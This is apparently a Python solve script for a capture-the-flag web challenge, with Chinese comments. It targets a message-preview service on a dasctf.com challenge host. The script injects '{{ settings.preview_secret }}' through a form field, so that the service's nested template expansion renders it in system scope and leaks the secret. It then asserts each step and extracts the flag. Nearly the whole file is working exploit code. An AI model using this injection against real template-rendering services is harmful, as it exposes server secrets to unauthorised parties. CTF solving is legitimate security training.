import re, sys, urllib.parse, urllib.request

FLAG_RE = re.compile(r"CTF2\{[0-9a-f-]{36}\}|flag\{[^}]{4,64}\}")

def post(url, fields, timeout=30):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with op.open(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

def preview(base, body, promo, expand="nested"):
    html = post(base.rstrip("/") + "/preview", {
        "body": body, "f_recipient": "林晓",
        "f_order": "PP-2026-1147", "f_promo": promo, "expand": expand,
    })
    m = re.search(r'<div class="preview-render">(.*?)</div>', html, re.S)
    diag = ""
    i = html.find('id="diagBody"')
    if i >= 0:
        diag = " ".join(re.sub(r"<[^>]+>", " ", html[i:i+1600]).split())
    return (m.group(1) if m else ""), diag

base = 'http://67199d92f677143ff111861a.http-ctf2.dasctf.com/'

# 断言 1：基线正常，PASS1 作用域是 user
r0, d0 = preview(base, "{{ recipient_name }}/{{ order_ref }}/{{ promo_code }}", "ABC")
assert "林晓" in r0 and "PP-2026-1147" in r0 and "ABC" in r0
assert "scope= user" in d0

# 断言 2：single 档字段值原样字面量输出（对照）
r1, d1 = preview(base, "{{ promo_code }}", "{{ settings.preview_secret }}", "single")
assert "{{ settings.preview_secret }}" in r1 and "嵌套展开已关闭" in d1

# 断言 3：nested 档触发 PASS2 且作用域为 system
r2, d2 = preview(base, "{{ promo_code }}", "{{ settings.preview_secret }}", "nested")
assert "PASS 2" in d2 and "scope= system" in d2

# 断言 4：flag 格式自检
flag = FLAG_RE.search(r2).group(0)
assert re.fullmatch(r"CTF2\{[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\}", flag)
print(flag)